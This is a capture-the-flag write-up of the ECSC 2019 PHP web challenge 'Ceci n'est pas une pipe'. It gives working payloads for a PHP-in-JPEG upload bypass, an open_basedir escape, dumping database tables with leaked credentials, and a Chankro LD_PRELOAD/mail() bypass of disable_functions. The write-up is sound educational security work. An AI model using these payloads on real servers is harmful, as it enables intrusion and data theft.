+++
title = "ECSC - Ceci n'est pas une pipe"
description = ""
author = "dotan3"
date = 2019-05-31T09:51:48+02:00
tags = ["web", "php", "rce", "open_basedir", "allow_url_fopen", "LD_PRELOAD", "putenv", "mail"]
draft = false
+++

The challenge description:

```
Ça se passe par ici : http://challenges.ecsc-teamfrance.fr:8001
```

## Reconnaissance

`Ceci n'est pas une pipe` is the very first challenge I tried during [ECSC 2019 qualifications](https://www.ssi.gouv.fr/administration/actualite/rejoignez-lequipe-france-pour-la-prochaine-edition-du-challenge-europeen-de-cybersecurite/). It's a web challenge and it starts with a login page:

![ECSC 2019 - Ceci n'est pas une pipe - Login](/img/ecsc-2019-ceci-nest-pas-une-pipe-login.png)

### First steps

From this very first page, some information already:

* It's probably a PHP challenge because of the url: `login.php`
* The HTML source does not reveal anything interesting
* According to the HTTP response headers, the web server is `Apache 2.4.25 (Debian)`
  - From this [we can infer](https://packages.debian.org/search?keywords=apache2) that Debian version is Stretch and Apache is at the latest stable version
* I tried simplistic <abbr title="SQL injection">SQLi</abbr>, nothing

![ECSC 2019 - Ceci n'est pas une pipe - HTTP response headers](/img/ecsc-2019-ceci-nest-pas-une-pipe-http-response-headers.png)

Seeing a `/static` folder in the HTML source, I tried to list the contents but it seems directory listing is forbidden on this server:

![ECSC 2019 - Ceci n'est pas une pipe - Forbidden direcory listing](/img/ecsc-2019-ceci-nest-pas-une-pipe-forbidden-directory-listing.png)

### Gobustering

As always for a web challenge I let an instance of `gobuster` run in the background while I do manual recon.

> It's always good to have some type of enumeration running in the background

Inspiration: [Ippsec](https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA)

```bash
$ go run /opt/gobuster/main.go -w /opt/wordlists/SecLists/Discovery/Web-Content/quickhits.txt -u http://challenges.ecsc-teamfrance.fr:8001 -x php
```

It did not find that much besides the URLs that are already visible in the browser. One stood out though:

```
/config.php (Status: 200)
```

I get a 200 when requesting this on the server but it gives back an empty page.<br>
More on that later.

### Creating an account

So far so good, nothing particularily interesting so let's create an account and login:

![ECSC 2019 - Ceci n'est pas une pipe - Logged in](/img/ecsc-2019-ceci-nest-pas-une-pipe-logged-in.png)

OK now we know we can add notes with files, let's try with a simple .txt first:

```bash
$ echo "dotan3" > test.txt
```

It does not work, the web server is expecting a `JPEG` or a `PNG` file that's below 100kB:

![ECSC 2019 - Ceci n'est pas une pipe - Web server expects an image](/img/ecsc-2019-ceci-nest-pas-une-pipe-webserver-expects-an-image.png)

So let's try again with a `.png` file:

![ECSC 2019 - Ceci n'est pas une pipe - Working .png upload](/img/ecsc-2019-ceci-nest-pas-une-pipe-working-png-upload.png)

By hovering the image name, we notice the following URL:

`http://challenges.ecsc-teamfrance.fr:8001//upload/a24aa868b0558786eb26f02ffe704b59305e4cc41c1641909620d63799677660/googlelogo_color_92x30dp.png`

### Attacking the file upload feature

Since it's a PHP challenge, maybe there's a way to smuggle some PHP code inside an image?<br>
Let's try!

At first I tried to grab the HTTP request in Burp and repeat it, trying these things:

* Upload a .php file renamed as a .jpg > <span style="color: red;">failure</span>
* Upload a .php file with tweaked content-type > <span style="color: red;">failure</span>
* Upload a .png file with some php code in it > <span style="color: red;">failure</span>
* Upload a .php file with GIF magic bytes at the begining > <span style="color: red;">failure</span>

From these tests we can guess that there's some type of MIME type check; apparently the extension does not matter, the uploaded file just has to be a valid png/jpg file.

After some googling I found `jhead`, a utility that allows to manipulate jpg headers: http://www.sentex.net/~mwandel/jhead/, so maybe I could inject PHP in an image?<br>
Let's find out:

```bash
$ sudo apt search jhead # cool it's available!
$ sudo apt install jhead
$ jhead -h
Jhead is a program for manipulating settings and thumbnails in Exif jpeg headers
used by most Digital Cameras.  v3.00 Matthias Wandel, Jan 30 2013.
http://www.sentex.net/~mwandel/jhead

Usage: jhead [options] files
Where:
 files       path/filenames with or without wildcards
[options] are:

GENERAL METADATA:
  -te <name> Transfer exif header from another image file <name>
             Uses same name mangling as '-st' option
  -dc        Delete comment field (as left by progs like Photoshop & Compupic)
  -de        Strip Exif section (smaller JPEG file, but lose digicam info)
  -di        Delete IPTC section (from Photoshop, or Picasa)
  -dx        Deletex XMP section
  -du        Delete non image sections except for Exif and comment sections
  -purejpg   Strip all unnecessary data from jpeg (combines -dc -de and -du)
  -mkexif    Create new minimal exif section (overwrites pre-existing exif)
  -ce        Edit comment field.  Uses environment variable 'editor' to
             determine which editor to use.  If editor not set, uses VI
             under Unix and notepad with windows
```

That little `-ce` looks promising, so let's try it on a `.jpg` file that I rename to `.php`:

```bash
$ mv file.jpg file.php
$ jhead -ce file.php
```

This jumps me into `vim` and I can add a very simple PHP snippet:

```php
<?php echo "DOTAN3"; ?>
```

* Create a new note with this file
* Access the file
* Voilà!

![ECSC 2019 - Ceci n'est pas une pipe - PHP execution](/img/ecsc-2019-ceci-nest-pas-une-pipe-php-exec.png)

From this we know we have remote PHP execution on the server (<abbr title="Remote Code Execution">RCE</abbr>).

## Reconnaissance, pt. 2

Now that we have RCE, let's try and dig further, first by knowing a bit more about the PHP environment.<br>

### LFI attempt

I first tried to read the source code for the challenge and in parallel show the contents of the uploaded file to check if there's some restrcition on paths:

```php
<?php
    echo "DOTAN3 - START";
    echo file_get_contents('../../index.php');
    echo file_get_contents('file.jpg');
    echo "DOTAN3 - END";
?>
```

<small>I always keep some `DOTAN3` markers so that I know my script was executed and if it went til the end.</small>
<small>I am very happy to see that multiline PHP works, it will be much easier to read when my payload starts to grow...</small>

I could not get the contents of `file.jpg` nor of `../../index.php`.<br>
**There's definetely some filetering here.**

### RCE attempt

First thing I tried next was execute some system calls using PHP methods such as `exec()`, `system()` or `shell_exec()`:

```php
<?php
    echo "DOTAN3 - START";
    exec('ls');
    system('pwd');
    shell_exec('whoami');
    echo "DOTAN3 - END";
?>
```

<small>I use 3 different commands inside the system calls so that I know which one succeeded...</small>

It looks like **system call functions are forbidden** too because I have nothing back.<br>
Now is a good time to check `phpinfo()`;

```php
<?php
    echo "DOTAN3 - START";
    phpinfo();
    echo "DOTAN3 - END";
?>
```

Bingo!

![ECSC 2019 - Ceci n'est pas une pipe - phpinfo()](/img/ecsc-2019-ceci-nest-pas-une-pipe-phpinfo.png)

## Bypassing restrictions

I had a look at a few interesting areas in the result of `phpinfo()`:

### Known our limits...

#### Environment

![ECSC 2019 - Ceci n'est pas une pipe - phpinfo() - environment](/img/ecsc-2019-ceci-nest-pas-une-pipe-phpinfo-environment.png)

#### Core values

![ECSC 2019 - Ceci n'est pas une pipe - phpinfo() - core values](/img/ecsc-2019-ceci-nest-pas-une-pipe-phpinfo-core-values.png)

#### open_basedir

![ECSC 2019 - Ceci n'est pas une pipe - phpinfo() - open_basedir](/img/ecsc-2019-ceci-nest-pas-une-pipe-phpinfo-open_basedir.png)

Some really useful information there:

* We know the application working directory is the classic `/var/www/html`
* We could not use `file_get_contents` because the values for `allow_url_fopen` are `OFF`
* We could not use any system calls because the functions are in `disable_functions`
* There's some `prepend.php` file loaded from `/usr/share/php/chall/prepend.php`
  - Interesting, I did not even know about that [prepend feature](https://www.php.net/manual/fr/ini.core.php#ini.auto-prepend-file) in PHP!

### Trying more LFI with this knowledge

Maybe we can override `allow_url_fopen` settings with some `ini_set()`?

```php
<?php
    echo "DOTAN3 - START";
    ini_set('allow_url_fopen', 1);
    echo file_get_contents('sample.php');
    echo "DOTAN3 - END";
?>
```

Upload again and display the uploaded file:

![ECSC 2019 - Ceci n'est pas une pipe - Bypassing allow_url_fopen](/img/ecsc-2019-ceci-nest-pas-une-pipe-bypass-allow_url_fopen.png)

We're able to see the contents of the file itself, it works!

Now let's try to do things for files outside of `open_basedir`...

### Bypassing open_basedir restriction

I remembered a while back seeing on twitter a way to bypass `open_basedir` restrictions so I went and searched for it:

![ECSC 2019 - Ceci n'est pas une pipe - Searching for open_basedir bypass on twitter](/img/ecsc-2019-ceci-nest-pas-une-pipe-searching-for-open_basedir-bypass-on-twitter.png)

Source: https://twitter.com/edgarboda/status/1113839230608797696

Let's try it!

```php
<?php
    echo "DOTAN3 - START";
    ini_set('allow_url_fopen', 1);
    mkdir('tmp');
    chdir('tmp');
    ini_set('open_basedir', '..');
    chdir('..');
    chdir('..');
    chdir('..');
    chdir('..');
    chdir('..');
    ini_set('open_basedir', '/');
    echo file_get_contents('/var/www/html/index.php');
    echo "DOTAN3 - END";
?>
```

And it works!

![ECSC 2019 - Ceci n'est pas une pipe - Bypassing open_basedir restriction](/img/ecsc-2019-ceci-nest-pas-une-pipe-bypass-open_basedir-restriction.png)

It even looks better when displaying the source of the generated page:

![ECSC 2019 - Ceci n'est pas une pipe - Bypassing open_basedir restriction source](/img/ecsc-2019-ceci-nest-pas-une-pipe-bypass-open_basedir-restriction-source.png)

So now we can have a look at all the source files!

## The (wrong) path to SQL

Remember the `config.php` file from enumeration at the begining? Maybe the flag is there?

![ECSC 2019 - Ceci n'est pas une pipe - Get DB credz! wOOt!](/img/ecsc-2019-ceci-nest-pas-une-pipe-get-db-credz.png)

Flag is not in the `config.php` :-(, but we got DB credz, wOOt!<br>
Maybe the flag is in the DB?

Let's find out and start by listing the tables that are in the `notes` DB:

```php
<?php
    echo "DOTAN3 - START";
    $c = mysqli_connect("mariadb", "notes", "N9mpnvEyTtaGxfsznEBh", "notes");
    foreach ($c->query('SHOW TABLES;') as $row) {
      var_dump($row);
    }
    echo "DOTAN3 - END";
?>
```

We get two tables, `notes` and `users`:

![ECSC 2019 - Ceci n'est pas une pipe - Tables in notes DB](/img/ecsc-2019-ceci-nest-pas-une-pipe-listing-notes-db-tables.png)

Let's dump them!

```php
<?php
    echo "DOTAN3 - START";
    $c = mysqli_connect("mariadb", "notes", "N9mpnvEyTtaGxfsznEBh", "notes");
    foreach ($c->query('SELECT * FROM notes;') as $row) {
      var_dump($row);
    }
    foreach ($c->query('SELECT * FROM users;') as $row) {
      var_dump($row);
    }
    echo "DOTAN3 - END";
?>
```

Haha I get instantly XSSed :P

![ECSC 2019 - Ceci n'est pas une pipe - Dumping notes and users tables](/img/ecsc-2019-ceci-nest-pas-une-pipe-dumping-notes-users-tables.png)

I had a look at the source to try and see if the **flag** was somewhere, but was notwhere to be found... :-(

I could, however see all the other players attemps at doing so:

![ECSC 2019 - Ceci n'est pas une pipe - Another player's attempt](/img/ecsc-2019-ceci-nest-pas-une-pipe-another-players-attempt.png)

But I stopped there immediately, thinking I would not learn anything if I was able to get the flag that way.<br>
It's fun knowing you `can` do it, it does not necessarily mean you `should` do it.

## Hitting the brick wall, pt. 1

That's when I got stuck. If the flag was not in the DB, where could it be?

I tried to display the `prepend.php` file just so that I would learn something at least:

```php
<?php
    echo "DOTAN3 - START";
    ini_set('allow_url_fopen', 1);
    mkdir('tmp');
    chdir('tmp');
    ini_set('open_basedir', '..');
    chdir('..');
    chdir('..');
    chdir('..');
    chdir('..');
    chdir('..');
    ini_set('open_basedir', '/');
    echo file_get_contents('/usr/share/php/chall/prepend.php');
    echo "DOTAN3 - END";
?>
```

```php
<?php
    ini_set('open_basedir', dirname($_SERVER['SCRIPT_FILENAME']) . ':/usr/share/php/chall:/tmp');
```

More info on [auto_prepend_file directive](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file) on official PHP documentation.

Oh nice ok! So that is automatically adding you own upload folder in the `open_basedir` folders list. Neat!<br>
But still, no flag and I start to feel a lack of inspiration.

---

Wait, it's a CTF, maybe the flag is in some of the usual places? Let's try...

* /flag
* /flag.txt
* /root/flag
* ...

After a while (probably 1 hour...) I finally found where the flag could be: `/home/flag`

```php
<?php
    echo "DOTAN3 - START";
    ini_set('allow_url_fopen', 1);
    mkdir('tmp');
    chdir('tmp');
    ini_set('open_basedir', '..');
    chdir('..');
    chdir('..');
    chdir('..');
    chdir('..');
    chdir('..');
    ini_set('open_basedir', '/');
    echo is_file('/home/flag');
    echo "DOTAN3 - END";
?>
```

This outputs:

`bool(true)`

## Hitting the brick wall, pt. 2

Cool! Should be easy now, let's just file_get_contents that flag and DONE!<br>
Oh boy, how wrong was I...

```php
<?php
    echo "DOTAN3 - START";
    ini_set('allow_url_fopen', 1);
    mkdir('tmp');
    chdir('tmp');
    ini_set('open_basedir', '..');
    chdir('..');
    chdir('..');
    chdir('..');
    chdir('..');
    chdir('..');
    ini_set('open_basedir', '/');
    echo file_get_contents('/home/flag');
    echo "DOTAN3 - END";
?>
```

Nothing. Pleeeease? It took me ages to think I should maybe check the rights on this file:

```php
echo substr(sprintf('%o', fileperms('/home/flag')), -4);
```

**0311** which is equivalent to **-wx--x--x**

Which is equivalent to:

* everybody can execute it
* just the owner can write it, the owner being root

But how can I execute it if I can't use any of the regular system calls?

I tried then to email the file to me and to exfiltrate it by variously failing techniques.

> That's when I almost gave up.

I left this challenge a few days, thinking I would never succeed at it.

## Last chance

Then I started reading about automating the `open_basedir` restriction bypass and that's when I encountered [Chankro](https://github.com/TarlogicSecurity/Chankro):

> Your favourite tool to bypass disable_functions and open_basedir in your pentests.

OK, sounds like it's for me! Chankro expects a few parameters:

* A script to be executed: `--input`
* An output php script: `--output`
* And a path where the output script will be located: `--path`

Let's do this!

**First create a flag.sh script:**

```bash
#!/bin/bash
# Just execute the flag executable and output to a file I can read
/home/flag > /var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/flag2
```

**Then launch Chankro to generate the output file**

```bash
$ python chankro.py --arch 64 --input shell.sh --output sample.php --path /var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01
```

**Then see what's in the file...**

```php
<?php

$hook = 'f0VMRgIBAQAAAAAAAAAAAAMAPgABAAAA4AcAAAAAAABAAAAAAAAAAPgZAAAAAAAAAAAAAEAAOAAHAEAAHQAcAAEAAAAFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAoAAAAAAABsCgAAAAAAAAAAIAAAAAAAAQAAAAYAAAD4DQA...';
$meterpreter = 'IyEvYmluL2Jhc2gKL2hvbWUvZmxhZyA+IC92YXIvd3d3L2h0bWwvdXBsb2FkLzRkZjY5NTZjOTJhMTRjNTAxNGY4OTFjOTAxN2QwNTBiYzZkNzc3MmI2ZWFiNDE3MjcyNjkzOGExMjRjMzhlMDEvZmxhZzIK';
file_put_contents('/var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/chankro.so', base64_decode($hook));
file_put_contents('/var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/acpid.socket', base64_decode($meterpreter));
putenv('CHANKRO=/var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/acpid.socket');
putenv('LD_PRELOAD=/var/www/html/upload/4df6956c92a14c5014f891c9017d050bc6d7772b6eab4172726938a124c38e01/chankro.so');
mail('a','a','a','a');

?>
```

**Upload and win!**

* Uploaded the output.php file
* Accessed it in my uploads folder
* Access the flag2 file
* Got the flag, wOOt!

`ECSC{f12d9ff3a017065d4d363cea148bef8bfffacc31}`

---

## Conclusion

* Securing a PHP file upload it not trivial
* Leaving `putenv()` and `phpinfo()` as allowed functions made it *easy* to find the path to exploitation

Now I just need some time to fully understand what Chankro does, but thanks for this one anyway, I learned many things!

Kudos to the organizers of this CTF that I found quite fun, not too hard so I could progress and learn many new things.

---

### Edits

* 2019-05-31 10:28:00 CEST - Fix some typos